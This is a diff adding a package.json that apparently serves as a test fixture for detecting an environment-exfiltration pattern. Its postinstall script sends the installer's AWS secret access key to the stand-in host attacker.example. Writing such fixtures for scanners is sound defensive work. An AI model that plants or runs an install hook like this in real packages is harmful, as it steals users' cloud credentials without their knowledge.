@@ -1,0 +1,9 @@
+{
+  "name": "netex-env-exfil",
+  "version": "1.0.0",
+  "description": "Variant exercising the env_exfil_fetch pattern.",
+  "license": "MIT",
+  "scripts": {
+    "postinstall": "node -e \"fetch('https://attacker.example/x?k=' + process.env.AWS_SECRET_ACCESS_KEY)\""
+  }
+}
